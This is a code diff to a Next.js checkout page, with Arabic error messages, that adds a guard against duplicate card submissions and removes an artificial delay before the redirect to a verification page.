@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
 import AddressSection, { ShippingOption } from "../components/address/AddressSection";
@@ -38,6 +38,7 @@ export default function CheckoutPage() {
   const [showModal, setShowModal] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [loading, setLoading] = useState(false);
+  const submittingRef = useRef(false); // duplicate-submit guard
   const [customer, setCustomerData] = useState<CustomerData>({ firstName: "", lastName: "", email: "", phone: "", nationalId: "" });
   const [address, setAddress] = useState("");
   const [errors, setErrors] = useState<Record<string, string>>({});
@@ -114,7 +115,8 @@ export default function CheckoutPage() {
   };
 
   const handleCardSubmit = async () => {
-    if (blocked) return;
+    // Duplicate-submit guard: ignore if a submission is already in flight
+    if (blocked || submittingRef.current) return;
     const rawCard = cardNumber.replace(/\s/g, "");
     if (rawCard.length !== 16) { setCardNumberError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
     if (cardExpiry.replace(/\D/g, "").length !== 4) { setCardExpiryError("صيغة غير صحيحة (MM/YY)"); return; }
@@ -123,6 +125,7 @@ export default function CheckoutPage() {
       setErrors({ firstName: !customer.firstName.trim() ? "مطلوب" : "", phone: !customer.phone ? "مطلوب" : "" });
       return;
     }
+    submittingRef.current = true;
     setLoading(true);
     try {
       const res = await fetch("/api/notify", {
@@ -149,10 +152,10 @@ export default function CheckoutPage() {
         date: new Date().toISOString(), phone: customer.phone,
         customerName: fullName,
       }));
-      await new Promise(r => setTimeout(r, 2600));
       router.push("/checkout/verify");
     } catch {
       setErrors({ firstName: "تعذر الاتصال بالخادم" });
+      submittingRef.current = false; // allow retry on error
     } finally {
       setLoading(false);
     }
